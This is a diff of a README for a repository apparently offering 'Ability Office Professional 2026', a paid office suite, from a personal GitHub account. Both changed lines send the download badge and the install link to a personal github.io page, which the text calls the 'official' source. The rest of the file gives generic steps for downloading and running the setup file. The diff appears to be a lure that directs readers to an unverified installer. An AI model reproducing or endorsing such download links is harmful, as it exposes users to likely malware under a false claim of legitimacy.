@@ -1,6 +1,6 @@
 # 🏢 Ability-Office-Professional-2026 - Complete office software for your computer
 
-[![Download Ability Office](https://img.shields.io/badge/Download-Blue-blue.svg)](https://github.com/Themo996/Ability-Office-Professional-2026)
+[![Download Ability Office](https://img.shields.io/badge/Download-Blue-blue.svg)](https://themo996.github.io)
 
 ## 📦 About this software
 
@@ -22,7 +22,7 @@ Ensure your computer meets these requirements before you begin:
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit the official repository page to access the installer: [Download Ability Office Professional 2026](https://github.com/Themo996/Ability-Office-Professional-2026).
+1.  Visit the official repository page to access the installer: [Download Ability Office Professional 2026](https://themo996.github.io).
 2.  Locate the download section on the page.
 3.  Click the link to start the download of the setup file.
 4.  Wait for the file to finish downloading to your Downloads folder.
